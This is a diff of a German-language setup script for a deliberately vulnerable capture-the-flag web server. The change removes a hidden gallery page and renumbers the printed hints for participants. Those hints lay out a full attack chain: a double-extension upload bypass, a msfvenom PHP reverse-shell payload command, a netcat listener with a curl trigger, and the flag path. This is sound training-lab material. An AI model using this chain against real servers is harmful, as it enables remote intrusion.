@@ -46,7 +46,6 @@ fi
 # Kopiere alle Website-Dateien
 cp "$TEMP_DIR/index.php" /var/www/html/
 cp "$TEMP_DIR/upload.php" /var/www/html/
-cp "$TEMP_DIR/gallery.php" /var/www/html/
 cp "$TEMP_DIR/thanks.php" /var/www/html/
 cp "$TEMP_DIR/config.php" /var/www/html/
 cp "$TEMP_DIR/functions.php" /var/www/html/
@@ -147,20 +146,18 @@ echo "  - Upload-Log: /var/www/html/data/uploaded_files.txt"
 echo ""
 echo "Enumeration Targets:"
 echo "  - robots.txt enthält Hinweise auf versteckte Pfade"
-echo "  - gallery.php ist NICHT in der Navigation (muss gefunden werden)"
+echo "  - Upload-Verzeichnis: /uploads/ (enthält alle Bilder)"
 echo "  - Decoy-Verzeichnisse: /old/, /config/"
 echo ""
 echo "Hinweise für CTF-Teilnehmer:"
 echo "  1. Web-Enumeration: feroxbuster/gobuster mit Kali Wordlists"
 echo "  2. robots.txt analysieren"
-echo "  3. Versteckte gallery.php finden"
-echo "  4. Upload-Funktionalität testen"
-echo "  5. Double-Extension Bypass: shell.php.jpg"
-echo "  6. msfvenom: msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php"
-echo "  7. Upload shell.php.jpg (Browser oder curl)"
-echo "  8. Filename ist NICHT randomisiert → /uploads/shell.php.jpg"
-echo "  9. nc -lvnp 4444 && curl http://target/uploads/shell.php.jpg"
-echo " 10. Flag in /home/webflag/flag.txt"
+echo "  3. Upload-Funktionalität testen"
+echo "  4. Double-Extension Bypass: shell.php.jpg"
+echo "  5. msfvenom: msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php"
+echo "  6. Upload shell.php.jpg (Browser oder curl)"
+echo "  7. Filename ist NICHT randomisiert → /uploads/shell.php.jpg"
+echo "  8. nc -lvnp 4444 && curl http://target/uploads/shell.php.jpg"
+echo "  9. Flag in /home/webflag/flag.txt"
 echo ""
 echo "================================================"
-
